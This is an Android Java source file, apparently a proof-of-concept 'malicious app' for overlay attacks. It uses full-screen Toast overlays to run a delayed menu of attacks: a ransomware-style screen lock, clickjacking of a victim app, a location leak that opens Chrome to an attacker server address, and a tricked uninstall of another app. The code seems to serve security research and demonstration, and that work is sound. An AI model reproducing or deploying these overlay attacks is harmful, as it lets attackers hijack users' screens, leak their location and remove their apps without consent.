package nikita.kurtin.maliciousapp;

import androidx.appcompat.app.AppCompatActivity;

import android.app.AlertDialog;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.webkit.WebView;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.VideoView;

import java.sql.SQLOutput;


public class MaliciousActivity extends AppCompatActivity {

    private TextView ttl;
    private Context context = this;
    private Handler h;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_malicious);
        
        //ttl = findViewById(R.id.ttl);

        h = new Handler(Looper.getMainLooper());
    }



    @Override
    protected void onStart() {
        super.onStart();


        //Intent intent = new Intent("android.settings.APP_OPEN_BY_DEFAULT_SETTINGS", Uri.parse("package:nikita.kurtin.maliciousapp"));
        //startActivity(intent);

    }

    public void toast1(View v){
        Toast.makeText(context, "Toast message", Toast.LENGTH_LONG).show();
    }

    public void toast2(View v){
        View cv = LayoutInflater.from(context).inflate(R.layout.custom_toast, null);
        ImageView vv = cv.findViewById(R.id.img);
        vv.setVisibility(View.VISIBLE);
        vv.setImageResource(R.mipmap.defcon);

        overlay1(context, 0, cv);
    }

    public void toast3(View v){
        View cv = LayoutInflater.from(context).inflate(R.layout.custom_toast, null);
        VideoView vid = cv.findViewById(R.id.vid);
        vid.setVisibility(View.VISIBLE);

        vid.setVideoURI(Uri.parse("android.resource://"+getPackageName()+"/"+R.raw.simple_video));
        vid.start();

        overlay1(context, 0, cv);
    }

    public void toast4(View v){
        View cv = LayoutInflater.from(context).inflate(R.layout.custom_toast, null);
        WebView wv = cv.findViewById(R.id.wv);
        wv.setVisibility(View.VISIBLE);
        wv.loadData("<h1>Hello from webview</h1>", "text/html", "utf-8");

        overlay1(context, 0, cv);
    }

    public void toast5(View v){
        //InvisibleBackground.restart(context);

        overlay1(context,0, LayoutInflater.from(context).inflate(R.layout.overlay_fullscreen, null));
    }

    public void scheduleAttack(View v){
        long howLongToWait = 9000; // Change to whatever time you want
        System.out.println("Overlay POCs - ");

        // Direct post delayed execution:
        h.postDelayed(()-> {
            // Uncomment which attack you want to see:

            //internet2way(context);

            //ransomwareScreenBlock(context);

            //clickjackVictim(context);

            //locationBypass(context);

            //uninstallVictim(context);

            selfStop();
        }, howLongToWait);

    }

    static void internet2way(Context context){
        context.startActivity(new Intent(context, Internet2Way.class));
    }

    static void ransomwareScreenBlock(Context context){
        View v = LayoutInflater.from(context).inflate(R.layout.overlay1, null);
        overlay1(context,5, v); // To keep overlay screen block longer - increase the number
    }

    static void clickjackVictim(Context context){
        // Make sure you install victim.victim first OR change with your own victim app
        context.startActivity(new Intent("victim.victim"));
    }

    static void locationBypass(Context context){
        String url = "https://10.0.2.2:3002/loc"; // Change with your server address
        Uri chromeUri = Uri.parse("googlechrome://navigate?url="+url);
        Intent i = new Intent(Intent.ACTION_VIEW, chromeUri);
        i.setPackage("com.android.chrome");
        context.startActivity(i);
    }

    static void uninstallVictim(Context context){
        // For this POC attack add: REQUEST_DELETE_PACKAGES permission in AndroidManifest
        overlay1(context,1, LayoutInflater.from(context).inflate(R.layout.clickjack_uninstall, null));
        context.startActivity(new Intent(Intent.ACTION_DELETE, Uri.parse("package:victim.victim")));
    }

    private void selfStop(){
        finishAffinity();
        System.exit(0);
        finishAndRemoveTask();
    }

    private static void overlay1(Context context, final int count, final View v){
        Toast t = new Toast(context);
        t.setGravity(Gravity.FILL, 0, 0);
        t.setView(v);
        t.setDuration(Toast.LENGTH_LONG);
        t.show();
        if(count > 0){
            v.postDelayed(()->{
                overlay1(context,count - 1, v);
            }, 1000);
        }
    }

}